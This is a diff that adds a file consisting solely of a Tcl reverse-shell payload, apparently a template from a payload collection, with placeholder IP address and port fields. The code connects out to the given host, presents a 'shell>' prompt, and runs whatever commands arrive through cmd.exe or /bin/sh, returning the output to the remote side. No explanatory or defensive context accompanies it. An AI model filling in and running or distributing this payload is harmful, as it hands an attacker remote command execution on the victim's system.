@@ -1,0 +1,19 @@
+echo 'set s [socket __IPADDR__ __PORT__];
+while 42 {
+    puts -nonewline $s "shell>";
+    flush $s;
+    gets $s c;
+    
+    if {[string match *windows* [exec uname -s]]} {
+        set e "exec cmd.exe /c $c"
+    } else {
+        set e "exec /bin/sh -c $c"
+    }
+
+    if {! [catch {set r [eval $e]} err]} {
+        puts $s $r
+    }
+    flush $s;
+};
+close $s;' | tclsh
+
